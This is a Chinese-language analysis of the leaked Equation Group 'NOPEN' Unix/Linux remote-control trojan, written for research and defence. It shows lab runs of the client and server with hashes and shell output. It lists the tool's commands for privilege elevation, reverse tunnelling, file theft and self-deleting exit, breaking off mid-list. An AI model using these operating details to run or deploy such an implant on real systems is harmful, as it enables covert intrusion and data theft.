Equation NOPEN
Equation NOPEN
概述
基本信息
运行方法
本地环境变量
本地客户端命令
keepalive
autopilot
norc
远程目录命令
find
cd ls
远程文件操作
get put cat
upload
grep mailgrep
cksum
chili
远程网络穿透
tunnel
irtun istun jackpop
nrtun
nstun
rawsend
rtun
rutun
stun
sutun
scan
vscan
远程网络命令
icmptime
ifconfig
nslookup
ping trace
远程服务端命令
pid
listen
call
burn
远程服务端常用命令
elevate
ps
shell
time
status
getenv setenv
gs
操作分析
服务端反向连接到客户端
指定服务端口的正向连接
命令脚本的批量执行
autopot
incision
隧道的综合利用
elevate
对比分析
会话密钥生成
scaner
ourtn
scripme
总结
参考
概述
作者根据EQGRP公开资料进行研究分析，研究相关工具的开发实现和攻击防御思路。
“NOPEN”木马工具为针对Unix/Linux系统的远程控制工具，主要用于文件窃取、系统提权、网络通信重
定向以及查看目标设备信息等，是一个典型的C2程序。
“NOPEN”木马工具编码技术复杂、功能全面、隐蔽性强、适配多种处理器架构和操作系统，并且采用了
插件式结构，可以与其他网络武器或攻击工具进行交互和协作。
“NOPEN”木马工具包含客户端“noclient”和服务端“noserver”两部分，客户端会采取发送激活包的方式与
服务端建立连接，使用RSA算法进行秘钥协商，使用RC6算法加密通信流量。
基本信息
这里分析的代码来自github上的泄露。在Linux\bin\目录下。
对实际样本感兴趣的可以根据cncert的文章进行抓取和分析。
运行方法
这里的测试环境有两台机器，一台是centos4，运行noserver，IP地址是172.19.2.11。另一台是
centos5，运行noclient，IP地址是172.19.2.13.
启动服务端。
md5sum noclient-3.3.2.3-linux-i386  noserver-server
1d5bd438d76dd09edb91bbe81fc8e4f0  noclient-3.3.2.3-linux-i386
ee38509ddc4bef24d387c511c577895a  noserver-server
./noserver-server
[root@centos4x86 bvp47]# ps aux | grep no
root      5107  0.0  0.0  1784  332 pts/2    S    05:15   0:00 ./noserver-server
[root@centos4x86 bvp47]# lsof -p 5107
COMMAND    PID USER   FD   TYPE DEVICE    SIZE    NODE NAME
noserver- 5107 root  cwd    DIR  253,0    4096 1109807 /root/bvp47
noserver- 5107 root  rtd    DIR  253,0    4096       2 /
noserver- 5107 root  txt    REG  253,0  158686 1109895 /root/bvp47/noserver-
server
noserver- 5107 root  mem    REG  253,0  112212  898616 /lib/ld-2.3.4.so
这样服务端启动完毕，运行在32754端口。
启动客户端。
noserver- 5107 root  mem    REG  253,0 1547588  898617 /lib/tls/libc-2.3.4.so
noserver- 5107 root  mem    REG  253,0   81140  897717 /lib/libresolv-2.3.4.so
noserver- 5107 root    0u   CHR    1,3            2108 /dev/null
noserver- 5107 root    1u   CHR    1,3            2108 /dev/null
noserver- 5107 root    2u   CHR    1,3            2108 /dev/null
noserver- 5107 root    3u  IPv4  75542             TCP *:32754 (LISTEN)
./noclient-3.3.2.3-linux-i386 172.19.2.11
NOPEN!                             v3.3.2.3
sh: scanner: command not found
sh: ourtn: command not found
sh: scripme: command not found
Wed Mar 16 02:01:16 GMT 2022
NHOME: environment variable not set, assuming "NHOME=/home/hacker/test/.."
NHOME=/home/hacker/test/..
Reading resource file "/home/hacker/test/../etc/norc"... 
/home/hacker/test/../etc/norc: No such f
ile or directory
TERM=screen
Entering client mode
Attempting connection from 0.0.0.0:39955 to 172.19.2.11:32754... ok
Initiating RSA key exchange
  Receiving random number... ok
  Generating session key... 64EB17F95BFF6DA5F7509B7819998CF4
  Initializing RC6... ok
  Sending first verify string... ok
  Receiving second verify string... ok
RSA key exchange complete
NOPEN server version... 3.3.0.1 (version mismatch, 3.3.0.1 != 3.3.2.3)
Connection
  Bytes In / Out     607/376 (161%C) / 498/303 (164%C)
  Local Host:Port    localhost:39955 (127.0.0.1:39955)
  CRemote Host:Port  172.19.2.11:32754 (172.19.2.11:32754)
  Remote Host:Port   centos4x86.local:32754 (172.19.2.11:32754)
Local
  NOPEN client       3.3.2.3
  Date/Time          Wed Mar 16 02:01:16 UTC 2022
  History
  Command Out
  CWD                /home/hacker/test
  NHOME              /home/hacker/test/..
  PID (PPID)         28563 (15348)
Remote
  NOPEN server       3.3.0.1 (version mismatch, 3.3.0.1 != 3.3.2.3)
  WDIR               NOT SET
  OS                 Linux 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686
  CWD                /root/bvp47
  PID (PPID)         6139 (5107)
/home/hacker/test/../down/pid: No such file or directory
这样客户端就和服务端连接上了。
客户端首先检测环境，然后连接服务端。先通过RSA进行密钥协商，生成会话密钥。然后自动执行命令-
status，最后创建日志类文件。最后启动一个autoport。
简单看，server端，就是一个beacon，主要的功能都在client，作为控制端来操作server端。
本文的server端运行在centos4上，client端运行在centos5上。server端无法运行在centos5上。
连接完毕后，进入到命令行界面，提示符是NO! centos4x86.local:/root/bvp47>
分为三部分，NO!是工具类型，centos4x86.local是主机名称，/root/bvp47是server端的运行目录。
比较特别的是Started NOPEN autoport: 127.0.0.1:1025
Reading resource file "/home/hacker/test/../etc/norc.linux"... 
/home/hacker/test/../etc/norc.linux: No such file or directory
Creating history file 
"/home/hacker/test/../down/history/centos4x86.local.172.19.2.11"... ok
Creating command output file 
"/home/hacker/test/../down/cmdout/centos4x86.local.172.19.2.11-2022-03-16-
02:01:16"... ok
Started NOPEN autoport: 127.0.0.1:1025
ps aux | grep noclient
root       739  0.0  0.0   4028   664 pts/4    R+   22:13   0:00 grep noclient
hacker   28563  0.0  0.1   5144  1500 pts/3    S+   22:01   0:00 ./noclient-
3.3.2.3-linux-i386 172.19.2.11
lsof -p 28563
COMMAND     PID   USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
noclient- 28563 hacker  cwd    DIR  253,0     4096 3211931 /home/hacker/test
noclient- 28563 hacker  rtd    DIR  253,0     4096       2 /
noclient- 28563 hacker  txt    REG  253,0   442156 3211940 
/home/hacker/test/noclient-3.3.2.3-linux-i386
noclient- 28563 hacker  mem    REG  253,0    25462 2458548 /usr/lib/gconv/gconv-
modules.cache
noclient- 28563 hacker  mem    REG  253,0 56417808 2364009 
/usr/lib/locale/locale-archive
noclient- 28563 hacker  mem    REG  253,0    84904 3573276 /lib/libresolv-2.5.so
noclient- 28563 hacker  mem    REG  253,0   130860 3573257 /lib/ld-2.5.so
noclient- 28563 hacker  mem    REG  253,0  1706208 3573258 /lib/libc-2.5.so
noclient- 28563 hacker  mem    REG  253,0   216544 3573265 /lib/libm-2.5.so
noclient- 28563 hacker    0u   CHR  136,3      0t0       5 /dev/pts/3
noclient- 28563 hacker    1u   CHR  136,3      0t0       5 /dev/pts/3
noclient- 28563 hacker    2u   CHR  136,3      0t0       5 /dev/pts/3
noclient- 28563 hacker    3u  IPv4  41427      0t0     TCP 172.19.2.13:39955-
>172.19.2.11:32754 (ESTABLISHED)
noclient- 28563 hacker    4w   REG  253,0     1017 3154257 
/home/hacker/down/cmdout/centos4x86.local.172.19.2.11-2022-03-16-02:01:16
noclient- 28563 hacker    5u  IPv4  41433      0t0     TCP 
localhost.localdomain:blackjack (LISTEN)
grep blackjack /etc/services
blackjack       1025/tcp                        # network blackjack
blackjack       1025/udp                        # network blackjack
就是启动了一个端口，这个端口的功能是干啥的？
-?
[03-16-22 02:58:00 GMT][localhost:39955 -> centos4x86.local.172.19.2.11:32754]
[-?]
Remote General Commands:
Usage: -elevate 是否提权
Usage: -getenv 显示环境变量
Usage: -gs category|filename [options-if-any] 脚本执行
Usage: -setenv VAR=[val] 设置环境变量
Usage: -shell [alt_shell] 生成一个shell
Usage: -status 显示连接状态
Usage: -time 显示时间
Usage: -ps [options] 显示进程信息
  select: -p pid1,pid2,... -q ppid1,ppid2,... -g gpid1,gpid2,...
          -n user1,user2,... -u uid1,uid2,...
          -t "ddMmmyy hh:mm"|yyyymmddhhmm|epoch
  sort:   -P  -Q   -G   -N   -U  -T     -V
          pid ppid gpid user uid time   inverse
  grep:   -r regex [-v] [-i]
  show uid: -I
  show last 24hrs: -d
  tree view: -H
Remote Server Commands:
Usage: -burn 推出，如果是最后一个进程，就删除所有文件
Usage: -call toip toport 回连客户端
Usage: -listen port 启动新进程，监听端口
Usage: -pid 显示进程pid
Remote Network Commands:
Usage: -icmptime target_ip [source_ip] icmp应答时间
Usage: -ifconfig 显示网络配置信息
Usage: -nslookup name1 ... 查看dns信息
Usage: -ping -r remote_target_ip [-l local_source_ip] [-i|-u|-t] [-p dest_port] 
[-s src_port] ping主机
       -ping host
       -ping [-u|-t|-i] host
Usage: -trace -r remote_target_ip [-l local_source_ip] [-i|-u|-t] [-p dest_port] 
[-s src_port] 跟踪路由
       -trace host
       -trace [-u|-t|-i] host
Remote Redirection Commands:
Usage: -irtun target_ip call_back_port|RHP [listen_ip] [ourtn arguments]  调用
ourtn建立反向隧道
Usage: -istun target_ip call_in_port|RHP [srcip] [ourtn arguments] 调用ourtn建立隧
道
Usage: -jackpop target_ip target_port source_ip source_port 调用jpackpop
Usage: -nrtun [listenip:]port [fromip]  反向监听隧道
Usage: -nstun toip [toport [localport [srcport [srcip]]]] 隧道
       -nstun toip:port [srcip]
Usage: -rawsend [-s] tcp_port
Usage: -rtun [listenip:]port [toip [toport]] [fromip] 反向隧道
Usage: -rutun [listenip:]port [toip [toport]] 反向udp隧道
Usage: -scan [scan_name|port] [targetip] scanner来扫描端口存活
Usage: -sentry target_address source_address (tcp|udp) dest_port src_port 
interface 支持Solaris 2.6+的隧道工具
Usage: -stun toip toport [localport [srcport [srcip]]] 监听模式的隧道
Usage: -sutun toip toport [localport [srcport [srcip]]] udp监听模式的隧道
Usage: -tunnel [command_listen_port [udp|tcp [autoclose]]] 进入隧道菜单
Usage: -vscan  (should add help)
Remote File Commands:
Usage: -cat remfile 查看文件
Usage: -chili [-l] [-s lines] [-m max] MM-DD-YYYY remdir remfile [remfile ...]
Usage: -cksum remfile ... 查看文件hash
Usage: -fget [MM-DD-YYYY] loclist 下载文件
Usage: -get [-l] [-q] [-v] [-s minimumsize] [-m MM-DD-YYYY] remfile ... 下载文件
Usage: -grep [-d] [-v] [-n] [-i] [-h] [-C number_of_context_lines] pattern file1 